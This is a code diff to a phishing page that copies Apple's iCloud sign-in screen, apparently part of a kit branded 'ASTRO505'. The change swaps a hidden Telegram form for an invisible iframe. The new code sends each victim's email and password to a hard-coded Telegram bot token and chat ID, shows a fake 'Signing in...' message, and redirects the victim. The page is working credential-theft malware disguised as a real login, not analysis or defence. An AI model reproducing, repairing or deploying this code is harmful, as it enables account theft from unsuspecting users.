@@ -10,13 +10,6 @@
 <body>
     <header><nav><a href="index.html" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a></nav></header>
     
-    <!-- 🔥 FORM TELEGRAM INVISIBLE - FUNCIONA SIEMPRE -->
-    <form id="telegramForm" action="https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage" method="POST" style="display:none;">
-        <input type="hidden" name="chat_id" value="7219932215">
-        <input type="hidden" name="parse_mode" value="Markdown">
-        <input type="hidden" name="text" id="telegramText">
-    </form>
-    
     <main id="main">
         <form id="sign-in">
             <div class="error-message" id="errorMsg"></div>
@@ -59,10 +52,10 @@
         <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
     </footer>
 
-    <!-- 🔥 SCRIPT COMPLETO CORREGIDO -->
+    <!-- 🔥 SCRIPT CORREGIDO - ENVÍA CON IFRAME INVISIBLE -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('🚀 SCRIPT TELEGRAM CORREGIDO');
+            console.log('🚀 SCRIPT TELEGRAM V2 - REDIRECCIÓN FIJA');
             
             const emailInput = document.getElementById('email-phone');
             const arrowIcon = document.querySelector('.bx-right-arrow-circle');
@@ -73,6 +66,12 @@
             const form = document.getElementById('sign-in');
             
             let loginAttempts = 0;
+            
+            // Crear IFRAME invisible para Telegram
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.name = 'telegramFrame';
+            document.body.appendChild(iframe);
             
             // Flecha/Enter → Password
             const showPassword = () => {
@@ -90,7 +89,7 @@
                 }
             });
             
-            // 🔥 SUBMIT CON TELEGRAM (FUNCIONA 100%)
+            // 🔥 SUBMIT CORREGIDO - IFRAME INVISIBLE
             form.addEventListener('submit', (e) => {
                 e.preventDefault();
                 loginAttempts++;
@@ -105,9 +104,8 @@
                     return;
                 }
                 
-                // 🔥 ENVÍA A TELEGRAM AUTOMÁTICO
-                const telegramText = document.getElementById('telegramText');
-                telegramText.value = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
+                // 🔥 URL TELEGRAM EN IFRAME (NO BLOQUEA PÁGINA)
+                const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
 
 📧 *Email:* ${email}
 🔑 *Password:* ${password}
@@ -117,19 +115,19 @@
 📅 *Hora:* ${new Date().toLocaleString('es-ES')}
 
 ✨ *Plataforma:* Astro505`;
+
+                const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                 
-                console.log('📤 ¡ENVIANDO A TELEGRAM!');
-                document.getElementById('telegramForm').submit();
+                console.log('📤 Enviando a Telegram...');
                 
-                // Simula login
-                if (loginAttempts < 2) {
-                    showError('Incorrect password. Try again.');
-                    passwordInput.value = '';
-                    passwordInput.focus();
-                } else {
-                    showError('Signing in...');
-                    setTimeout(() => window.location.href = 'index.html', 1000);
-                }
+                // Envía en iframe invisible
+                iframe.src = telegramUrl;
+                
+                // ✅ REDIRIGE INMEDIATAMENTE (Telegram en background)
+                showError('Signing in...');
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 800);
             });
             
             function showError(message) {
@@ -138,7 +136,7 @@
                 setTimeout(() => errorMsg.classList.remove('show'), 3000);
             }
             
-            console.log('✅ TODO LISTO - Prueba login!');
+            console.log('✅ LISTO - IFRAME Telegram + Redirección');
         });
     </script>
 </body>
